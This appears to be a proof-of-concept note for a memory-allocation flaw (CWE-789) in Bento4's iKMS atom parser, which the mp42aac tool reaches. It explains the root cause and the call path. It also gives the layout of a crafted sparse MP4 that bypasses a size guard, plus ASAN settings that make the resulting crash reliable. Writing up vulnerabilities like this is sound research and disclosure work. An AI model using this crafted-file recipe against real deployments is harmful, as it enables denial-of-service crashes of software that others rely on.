# PoC Notes: VULN 001 - CWE-789 in AP4_IkmsAtom (Bento4)

## Vulnerability Summary

**File**: `Source/C++/Core/Ap4IkmsAtom.cpp`, lines 77-92  
**CWE**: CWE-789 (Memory Allocation with Excessive Size Value)  
**Binary**: `mp42aac`

## Root Cause

In `AP4_IkmsAtom::AP4_IkmsAtom(size, version, flags, stream)`, the variable
`string_size` is computed directly from the untrusted atom size field with no
upper-bound validation:

```cpp
AP4_Size string_size = size - AP4_FULL_ATOM_HEADER_SIZE;  // line 77
// ...
if (string_size) {
    char* str = new char[string_size];  // line 87 - massive allocation if size is huge
```

If the iKMS atom's size field is `0xFFFFFFFF`, then:
- `string_size = 0xFFFFFFFF - 12 = 0xFFFFFFF3` (~4 GB)
- `new char[0xFFFFFFF3]` attempts to allocate ~4 GB

The `Create()` factory function only checks `size < AP4_FULL_ATOM_HEADER_SIZE`
(i.e., size < 12) and `version <= 1`; a size of `0xFFFFFFFF` passes both checks.

## Attack Path

```
mp42aac vuln_001.mp4 /dev/null
  AP4_File::AP4_File(stream)          [Ap4File.cpp:250]
    AP4_File::ParseStream             [top-level atom loop]
      AP4_AtomFactory::CreateAtomFromStream(stream, bytes_available=~4GB, atom)
        [reads size=0xFFFFFFFF, type='iKMS'; bytes_available check passes]
        AP4_IkmsAtom::Create(size=0xFFFFFFFF, stream)
          AP4_Atom::ReadFullHeader(stream, version=0, flags=0)
          new AP4_IkmsAtom(0xFFFFFFFF, 0, 0, stream)
            string_size = 0xFFFFFFFF - 12 = 0xFFFFFFF3
            new char[0xFFFFFFF3]   <-- ~4 GB allocation: crash / ASAN abort
```

## PoC Approach

### File Structure

A sparse Linux file (~4 GB apparent size, near-zero disk usage) is used because
the atom factory guards against oversized atoms with:

```cpp
if (size > bytes_available) return AP4_ERROR_INVALID_FORMAT;
```

For a top-level atom, `bytes_available = stream_size - current_position`.  
With the iKMS box placed after a 16-byte `ftyp` in a ~4 GB sparse file:

```
bytes_available = 0x100010000 - 16 = 0x10000FFF0
iKMS.size       = 0xFFFFFFFF
0xFFFFFFFF <= 0x10000FFF0  → guard bypassed, Create() is reached
```

File layout (28 bytes of real content + sparse padding to ~4 GB):
```
ftyp (16 bytes)
iKMS [size=0xFFFFFFFF, type='iKMS', version=0, flags=0]  (12 bytes)
<sparse zeros up to 0x100010000>
```

### ASAN Consideration

On Linux systems where the kernel's overcommit is enabled (the default),
ASAN uses `mmap(MAP_NORESERVE)` for large allocations, which may succeed even
for 4 GB requests without committing physical memory.  To reliably demonstrate
the crash, the run script sets:

```
ASAN_OPTIONS=mmap_limit_mb=2000
```

This instructs ASAN to abort when heap-mmap usage exceeds 2 GB.  The ~4 GB
allocation (0xFFFFFFF3 bytes) exceeds this limit, triggering an ASAN assertion:

```
(total_mmaped >> 20) < common_flags()->mmap_limit_mb
```

On systems without overcommit (or with strict resource limits), the crash occurs
naturally via `std::bad_alloc` → unhandled exception → `std::terminate`.

## Expected Behavior

- **With ASAN (mmap_limit_mb=2000)**: ASAN aborts with mmap-limit assertion;
  process exits with non-zero status. This is confirmed VERIFIED_CRASH.
- **Without ASAN / strict limits**: `new char[0xFFFFFFF3]` throws `std::bad_alloc`
  (uncaught exception) → `std::terminate()` → SIGABRT → process crash.
- **Impact**: Denial of Service — any unprivileged user can crash the mp42aac
  process by supplying a crafted MP4 file.
